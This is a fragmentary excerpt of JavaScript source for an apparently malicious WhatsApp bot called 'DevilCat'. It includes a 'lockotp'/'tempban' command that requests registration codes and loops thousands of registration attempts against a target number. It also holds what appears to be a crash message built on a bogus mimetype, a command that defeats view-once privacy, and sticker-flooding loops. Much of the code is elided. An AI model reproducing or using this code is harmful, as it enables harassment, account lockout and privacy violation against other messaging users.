title: `Xeon's ur father`
  ...
  DevilCat.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊${xeontext11}`,
      caption: `𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 ${xeontext11}`,
    },
...
case 'lockotp': case 'tempban': {
  ...
  try {
    ...
    const xeonRequest = await DevilCat.requestRegistrationCode({
  ...
  for (let i = 0; i < 10000; i++) {
    try {
      ...
      await DevilCat.register(`${xeonPrefix}-${xeonSuffix}`);
    } catch (err) {
...
case 'readviewonce': case 'rvo': {
    ...
    if (/video/.test(type)) {
        return DevilCat.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return DevilCat.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'clearchat':
...
if (typemenu === 'v1') {
                    ...
                    DevilCat.sendMessage(m.chat, {
      video: fs.readFileSync('./DevilGallery/thumb2.mp4'),
      gifPlayback: true,
      caption: xeonmenuoh,
      contextInfo: {
      externalAdReply: {
      ...
      renderLargerThumbnail: true
		...
		if (m.isGroup && xeonresources.length > 30) {
			...
			for (let i = 0; i < xeonresources.length; i++) {
				DevilCat.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				DevilCat.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
